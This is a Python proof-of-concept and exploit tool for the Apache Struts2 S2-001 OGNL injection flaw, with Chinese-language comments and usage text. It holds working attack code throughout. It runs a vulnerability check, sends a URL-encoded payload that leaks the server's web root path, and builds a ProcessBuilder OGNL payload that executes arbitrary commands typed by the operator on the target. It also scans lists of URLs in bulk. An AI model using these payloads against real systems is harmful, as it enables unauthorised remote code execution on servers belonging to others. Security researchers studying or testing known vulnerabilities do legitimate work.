'''
Author: your name
Date: 2021-03-19 19:58:10
LastEditTime: 2021-03-21 17:36:30
LastEditors: Please set LastEditors
Description: In User Settings Edit
FilePath: \S2-001\S2-001_poc.py
'''
import requests
from urllib.parse import quote 
import json
import os
import time
import sys
os.system('')
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class S2_001:
    def __init__(self):
        self.headers={
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.poc= self.url_change('%{999*10}')
        #self.exp_webpath=self.url_change('%{ #req=@org.apache.struts2.ServletActionContext@getRequest(), #response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(), #response.println(#req.getRealPath('/')), #response.flush(), #response.close() }')
    # url编码转换
    def url_change(self,content):
        values=quote(content)
        return values
    def title(self):
        print('------------------------------------------')
        print('[+]漏洞名称：Sreuts2 S2-001 任意代码执行漏洞')
        print('[+]适用版本：Struts 2.0.0 - 2.0.8')
        print('[+]使用格式: python3 poc.py -u url')
        print('[+]使用格式: python3 poc.py -h 获取帮助')
        print('[+]可以批量检测，例：http://x.x.x.x:8080/login.action')
        print('------------------------------------------')
    def check(self,target_url):
        """检测漏洞是否存在"""
        num=999*10
        payload =f'username=text&password={self.poc}'
        try:
            res=requests.post(url=target_url,data=payload,headers=self.headers)
            if str(num) in res.text:
                print(f"\033[31m[!] {target_url} 存在S2-001漏洞\033[0m")
            else:
                print(f"[+] {target_url} 不存在S2-001漏洞")
        except Exception as e:
            print(f"\033[31m[x]请求出错 ,{e}\033[0m")
            sys.exit(0)
    def get_path(self,target_url,webpath):
        """获取web路径"""
        if webpath==True:
            exp_webpath=('%25%7b%20%23%72%65%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%73%74%72%75%74%73%32%2e%53%65%72%76%6c%65%74%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%40%67%65%74%52%65%71%75%65%73%74%28%29%2c%20%23%72%65%73%70%6f%6e%73%65%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%22%29%2e%67%65%74%57%72%69%74%65%72%28%29%2c%20%23%72%65%73%70%6f%6e%73%65%2e%70%72%69%6e%74%6c%6e%28%23%72%65%71%2e%67%65%74%52%65%61%6c%50%61%74%68%28%27%2f%27%29%29%2c%20%23%72%65%73%70%6f%6e%73%65%2e%66%6c%75%73%68%28%29%2c%20%23%72%65%73%70%6f%6e%73%65%2e%63%6c%6f%73%65%28%29%20%7d')
            payload =f'username=text&password={exp_webpath}'
            try:
                res=requests.post(url=target_url,data=payload,headers=self.headers)
            except Exception as e:
                print(f"\033[31m[x]请求出错 ,{e}\033[0m")
                sys.exit(0)
            print(res.text)
    def exec_cmd(self,target_url,exec):
        """执行任意命令"""
        cmd=input('[+]请输入需要执行的命令>>>')
        if ' 'in cmd:
            cmd = cmd.split(' ')
            cmd = f'{cmd[0]}%22,%22{cmd[1]}'
        payload=f'username=test&password=%25%7B%20#a=(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B%22{cmd}%22%7D)).redirectErrorStream(true).start(),%20#b=#a.getInputStream(),%20#c=new%20java.io.InputStreamReader(#b),%20#d=new%20java.io.BufferedReader(#c),%20#e=new%20char%5B50000%5D,%20#d.read(#e),%20#f=#context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22),%20#f.getWriter().println(new%20java.lang.String(#e)),%20#f.getWriter().flush(),#f.getWriter().close()%20%7D'
        try:
            res=requests.post(url=target_url,data=payload,headers=self.headers)
        except Exception as e:
            print(f"\033[31m[x]请求出错 ,{e}\033[0m")
            sys.exit(0)
        print(res.text)
    def main(self,target_url,webpath,exec,data,file):
        self.title()
        if target_url:
            self.check(target_url)
        if webpath:
            self.get_path(target_url,webpath)
        if exec:
            self.exec_cmd(target_url,exec)
        if file:
            #读取文件
            for url in args.file:
                url=url.replace('\n','')
                self.check(url)
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',type=str, default=False,help="要攻击的主机名或IP")
    parser.add_argument("-f", '--file', type=argparse.FileType('r'), default=False, help="需要读取的文件")
    parser.add_argument("-w", '--webpath',action='store_true',help="获取web路径,无需跟参数")
    parser.add_argument("-e", '--exec',action='store_true',help="执行命令")
    parser.add_argument("-d", '--data', type=str, default=False, help="自定义post包")
    args = parser.parse_args()
    poc=S2_001()
    poc.main(args.url,args.webpath,args.exec,args.data,args.file)
